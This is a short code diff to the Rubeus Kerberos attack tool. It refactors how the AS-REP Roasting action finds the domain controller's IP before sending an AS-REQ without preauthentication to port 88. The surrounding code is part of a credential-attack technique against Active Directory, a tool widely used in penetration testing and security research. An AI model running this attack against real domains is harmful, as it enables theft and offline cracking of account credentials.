@@ -22,32 +22,13 @@ namespace Rubeus
 
             Console.WriteLine("[*] Action: AS-REP Roasting");
 
-            // grab the default DC if none was supplied
-            if (String.IsNullOrEmpty(domainController)) {
-                domainController = Networking.GetDCName();
-                if(String.IsNullOrEmpty(domainController))
-                {
-                    Console.WriteLine("[X] Error retrieving the current domain controller.");
-                    return;
-                }
-            }
-
-            System.Net.IPAddress[] dcIP = null;
-
-            try
-            {
-                dcIP = System.Net.Dns.GetHostAddresses(domainController);
-            }
-            catch (Exception e) {
-                Console.WriteLine("[X] Error retrieving IP for domain controller \"{0}\" : {1}", domainController, e.Message);
-                return;
-            }
-            Console.WriteLine("\r\n[*] Using domain controller: {0} ({1})", domainController, dcIP[0]);
+            string dcIP = Networking.GetDCIP(domainController);
+            if (String.IsNullOrEmpty(dcIP)) { return; }
 
             Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: '{0}\\{1}'", domain, userName);
             byte[] reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac);
 
-            byte[] response = Networking.SendBytes(dcIP[0].ToString(), 88, reqBytes);
+            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
             if (response == null)
             {
                 return;
